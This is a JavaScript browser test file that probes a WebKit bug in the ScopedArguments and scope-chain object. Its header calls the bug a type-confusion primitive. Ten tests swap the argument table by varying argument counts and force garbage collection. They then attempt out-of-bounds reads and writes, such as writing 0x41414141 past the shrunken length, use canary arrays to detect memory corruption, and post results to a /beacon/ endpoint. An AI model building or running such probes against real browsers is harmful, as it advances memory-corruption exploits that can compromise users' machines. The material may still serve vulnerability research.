/* p125-scoped-arguments — the `arguments` / scope-chain object.
 *
 * Why this target: WebKit bug 315082 (CVE-2026-64757, fixed May 2026) rewrote
 * ScopedArgumentsTable and notes that its ScopeOffsets are "usable as an
 * unchecked index into JSLexicalEnvironment::variables()". That is a
 * type-confusion primitive by construction. It is pure runtime, LLInt-only,
 * and sits in the same `super` + scope area as Relapse.
 *
 * The reachable mutation is SymbolTable::trySetArgumentsLength(), triggered by
 * calling one function with different argument counts. The table is swapped and
 * the old buffer freed. Anything that still holds the old length is a bug.
 *
 * Beacon prefix: P125A-
 */
(function () {
var PREFIX = "P125A";
var RUN = "p125a" + Math.random().toString(36).slice(2, 12);

function post(tag, body) {
  var s = typeof body === "string" ? body : JSON.stringify(body);
  try {
    fetch("/beacon/" + PREFIX + "-" + tag, {
      method: "POST", body: JSON.stringify({ r: RUN, b: s }),
      headers: { "Content-Type": "application/json" }, keepalive: true
    })["catch"](function () {});
  } catch (e) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/beacon/" + PREFIX + "-" + tag, false);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify({ r: RUN, b: s }));
    } catch (e2) {}
  }
}
function mark(n) { post("M", n); }
function en(e) { return e && (e.name + ":" + String(e.message).slice(0, 80)); }
function delay(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

function forceGC(rounds) {
  if (typeof gc === "function") { try { gc(); return "gc()"; } catch (e) {} }
  var n = 0;
  while (n++ < (rounds || 12)) {
    var junk = new Array(40000);
    for (var i = 0; i < junk.length; i++) junk[i] = { i: i };
    junk = null;
    for (var b = 0; b < 4; b++) new ArrayBuffer(1 << 20);
  }
  return "churn";
}

var CAN = new Uint32Array(512);
for (var ci = 0; ci < CAN.length; ci++) CAN[ci] = (0xF0000000 + ci) >>> 0;
function canaryOK() {
  for (var i = 0; i < CAN.length; i++) if (CAN[i] !== ((0xF0000000 + i) >>> 0)) return false;
  return true;
}

var TESTS = [];
function T(name, fn) { TESTS.push([name, fn]); }

var BIG = 40000;

/* factory: a function that must use ScopedArguments (super + eval) */
function makeClass() {
  var Base = function () {};
  Base.prototype.m = function () { return 1; };
  class Derived extends Base {
    f() {
      var s = super.m();          // forces scope materialisation
      var a = arguments;
      return function () { return { s: s, len: a.length, a0: a[0], a1: a[1], aLast: a[a.length - 1] }; };
    }
  }
  return new Derived();
}

T("S1-vary-argcount-captured", function () {
  var d = makeClass();
  var g1 = d.f(1, 2, 3);
  var g2 = d.f(9);                        // shrink -> trySetArgumentsLength
  var g3 = d.f(1, 2, 3, 4, 5, 6, 7, 8);   // grow
  var g4 = d.f();                         // zero
  var out = { g1: g1(), g2: g2(), g3: g3(), g4: g4() };
  forceGC(6);
  out.g1again = g1();                     // read after GC + table swaps
  return out;
});

T("S2-big-then-small-write-oob", function () {
  var d = makeClass();
  var aRef = null, setter = null;
  var Base = function () {};
  Base.prototype.m = function () { return 1; };
  class D extends Base {
    make() {
      super.m();
      aRef = arguments;
      var me = this;
      setter = function (idx, val) { aRef[idx] = val; return aRef[idx]; };
      return arguments.length;
    }
  }
  var x = new D();
  var args = new Array(BIG);
  for (var i = 0; i < BIG; i++) args[i] = i & 0xffff;
  var n1 = x.make.apply(x, args);         // table length BIG
  var n2 = x.make(1);                     // table shrinks to 1
  var out = { n1: n1, n2: n2, lenNow: aRef.length };
  try { out.wrote = setter(BIG - 1, 0x41414141); }
  catch (e) { out.writeErr = en(e); }
  try { out.readBack = aRef[BIG - 1]; } catch (e) { out.readErr = en(e); }
  out.lenAfter = aRef.length;
  return out;
});

T("S3-big-then-small-define-property", function () {
  var Base = function () {};
  Base.prototype.m = function () { return 1; };
  var aRef = null;
  class D extends Base {
    make() { super.m(); aRef = arguments; return arguments.length; }
  }
  var x = new D();
  var args = new Array(BIG); for (var i = 0; i < BIG; i++) args[i] = 1;
  x.make.apply(x, args);
  x.make(1);
  var out = { len: aRef.length };
  try {
    Object.defineProperty(aRef, BIG - 1, { value: 0x42424242, configurable: true });
    out.define = "ok";
  } catch (e) { out.define = en(e); }
  try { out.read = aRef[BIG - 1]; } catch (e) { out.readErr = en(e); }
  return out;
});

T("S4-arguments-length-write", function () {
  var aRef = null;
  var Base = function () {}; Base.prototype.m = function () { return 1; };
  class D extends Base {
    make() {
      super.m();
      aRef = arguments;
      var before = arguments.length;
      try { arguments.length = 0; } catch (e) { return { before: before, setErr: en(e) }; }
      return { before: before, after: arguments.length, a0: arguments[0] };
    }
  }
  var x = new D();
  var r = x.make(7, 8, 9);
  return { r: r, lenAfter: aRef.length, a0: aRef[0], a2: aRef[2] };
});

T("S5-eval-arguments", function () {
  var Base = function () {}; Base.prototype.m = function () { return 1; };
  var aRef = null;
  class D extends Base {
    make() {
      super.m();
      aRef = arguments;
      var inner = eval("arguments.length");   // eval sees ScopedArguments
      return { inner: inner, outer: arguments.length };
    }
  }
  var x = new D();
  var r1 = x.make(1, 2, 3);
  var r2 = x.make(4);
  var r3 = x.make(5, 6, 7, 8, 9);
  return { r1: r1, r2: r2, r3: r3, lenNow: aRef.length };
});

T("S6-delete-and-iterate", function () {
  var aRef = null;
  var Base = function () {}; Base.prototype.m = function () { return 1; };
  class D extends Base {
    make() { super.m(); aRef = arguments; return arguments.length; }
  }
  var x = new D();
  var out = {};
  x.make(10, 20, 30);
  try { out.del = delete aRef[1]; } catch (e) { out.delErr = en(e); }
  out.len = aRef.length;
  out.a1 = aRef[1];
  try { out.spread = Array.prototype.slice.call(aRef); } catch (e) { out.sliceErr = en(e); }
  try { out.from = Array.from(aRef); } catch (e) { out.fromErr = en(e); }
  try { out.json = JSON.stringify(aRef); } catch (e) { out.jsonErr = en(e); }
  return out;
});

T("S7-apply-arguments-to-apply", function () {
  var aRef = null;
  var Base = function () {}; Base.prototype.m = function () { return 1; };
  class D extends Base {
    make() { super.m(); aRef = arguments; return arguments.length; }
  }
  var x = new D();
  function target() { return arguments.length; }
  x.make(1, 2, 3, 4);
  var out = {};
  try { out.n = target.apply(null, aRef); } catch (e) { out.err = en(e); }
  x.make(1);
  try { out.n2 = target.apply(null, aRef); } catch (e) { out.err2 = en(e); }
  return out;
});

T("S8-super-through-proxy", function () {
  var out = {};
  var hits = 0;
  var proto = new Proxy({ m: function () { return 7; } }, {
    get: function (t, k, r) {
      hits++;
      if (k === "m") return function () { return 7; };
      return t[k];
    },
    has: function (t, k) { return k in t; }
  });
  function Base() {}
  Base.prototype = proto;
  class D extends Base {
    f() { return super.m(); }
  }
  try { out.r = new D().f(); } catch (e) { out.err = en(e); }
  out.hits = hits;
  return out;
});

T("S9-with-unscopables", function () {
  var out = {};
  var obj = { x: 1 };
  obj[Symbol.unscopables] = { x: true };
  try {
    with (obj) {
      out.xVisible = (typeof x === "undefined") ? "hidden" : "visible:" + x;
    }
  } catch (e) { out.err = en(e); }
  return out;
});

T("S10-defineproperty-on-arguments", function () {
  var aRef = null;
  var Base = function () {}; Base.prototype.m = function () { return 1; };
  class D extends Base {
    make() { super.m(); aRef = arguments; return arguments.length; }
  }
  var x = new D();
  x.make(1, 2, 3);
  var out = {};
  try {
    Object.defineProperty(aRef, "0", { get: function () { return 99; }, configurable: true });
    out.getter = aRef[0];
  } catch (e) { out.err = en(e); }
  try { aRef[0] = 5; out.setAfter = aRef[0]; } catch (e) { out.setErr = en(e); }
  return out;
});

/* runner */
function run() {
  post("L", "p125 start");
  var i = 0;
  function step() {
    if (i >= TESTS.length) { post("Z", "p125 done"); return; }
    var name = TESTS[i][0], fn = TESTS[i][1]; i++;
    mark(name);
    var t0 = Date.now(), done = false;
    var timer = setTimeout(function () { fin({ TIMEOUT: true }); }, 15000);
    function fin(res) {
      if (done) return; done = true; clearTimeout(timer);
      res = res || {}; res.ms = Date.now() - t0; res.canary = canaryOK();
      post(name, res);
      setTimeout(step, 150);
    }
    try {
      var r = fn();
      if (r && typeof r.then === "function") {
        r.then(function (v) { fin({ ok: true, v: v }); },
               function (e) { fin({ ok: false, err: en(e) }); });
      } else fin({ ok: true, v: r });
    } catch (e) { fin({ ok: false, err: en(e) }); }
  }
  step();
}

if (typeof document !== "undefined" && document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", run);
} else run();
})();
